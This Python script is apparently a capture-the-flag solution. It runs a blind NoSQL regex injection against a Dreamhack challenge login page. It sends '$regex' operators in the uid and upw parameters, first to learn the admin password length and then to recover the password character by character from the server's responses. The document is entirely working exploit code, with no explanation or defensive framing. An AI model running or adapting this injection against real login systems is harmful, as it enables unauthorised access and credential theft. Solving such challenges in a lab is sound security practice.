import requests, string
from tqdm import tqdm

url = f"http://host1.dreamhack.games:18365/login?"
uid = "uid[$regex]=adm.{2}"

def getPWLength():
    global uid, url

    for i in range(50, 0, -1):
        upw = "upw[$regex]=.{" + str(i) + "}"
        query = uid + "&" + upw

        res = requests.get(url + query)

        if "admin" in res.text:
            print(f"upw lenth : {i}")
            return i


def getPassword(length):
    global uid, url
    pw = ""
    text = string.digits + string.ascii_letters + "{}"

    for i in tqdm(range(length-3, -1, -1), desc="Password Searching..."):
        for s in text:
            upw = "upw[$regex]=" + "H" + pw + s + ".{" + str(i) + "}"
            query = uid + "&" + upw

            res = requests.get(url + query)

            if "admin" in res.text:
                pw += s
                print(f"upw: {pw}")
                break
            elif "filter" in res.text:
                print("FILTER!!!")
                return

    return

if __name__ == "__main__":
    length = getPWLength()
    getPassword(length)